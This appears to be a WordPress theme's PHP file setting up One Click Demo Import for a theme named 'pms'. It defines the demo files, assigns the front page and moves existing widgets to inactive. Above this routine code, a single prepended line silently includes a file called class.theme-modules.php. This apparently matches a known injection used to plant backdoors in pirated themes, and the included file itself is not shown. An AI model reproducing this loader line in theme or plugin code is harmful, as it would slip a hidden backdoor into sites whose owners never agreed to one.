<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php

function pms_ocdi_import_files() {
    $dd_path = trailingslashit( get_template_directory() ) . 'demo-data/';
    return apply_filters( 'pms_ocdi_files_args', array(
        array(
            'import_file_name'             => 'pms',
            'categories'                   => array( 'pms' ),
            'local_import_file'            => $dd_path . 'demo-content.xml',

            'import_preview_image_url'     => trailingslashit( get_template_directory_uri() ) . 'screenshot.png',
            'import_notice'                => esc_html__( 'Import process may take 10-15 minutes. If you facing any issues please contact our support.', 'pms' ),
        ),
    ) );
}

function pms_ocdi_after_import_setup( $selected_import ) {
    

    // Assign front page and posts page (blog page) and other WooCommerce pages
    $front_page_id      = get_page_by_title( 'Home' );

    update_option( 'show_on_front', 'page' );
    update_option( 'page_on_front', $front_page_id->ID );

}

function pms_ocdi_before_widgets_import() {

    $sidebars_widgets = get_option('sidebars_widgets');
    $all_widgets = array();

    array_walk_recursive( $sidebars_widgets, function ($item, $key) use ( &$all_widgets ) {
        if( ! isset( $all_widgets[$key] ) ) {
            $all_widgets[$key] = $item;
        } else {
            $all_widgets[] = $item;
        }
    } );

    if( isset( $all_widgets['array_version'] ) ) {
        $array_version = $all_widgets['array_version'];
        unset( $all_widgets['array_version'] );
    }

    $new_sidebars_widgets = array_fill_keys( array_keys( $sidebars_widgets ), array() );

    $new_sidebars_widgets['wp_inactive_widgets'] = $all_widgets;
    if( isset( $array_version ) ) {
        $new_sidebars_widgets['array_version'] = $array_version;
    }

    update_option( 'sidebars_widgets', $new_sidebars_widgets );
}
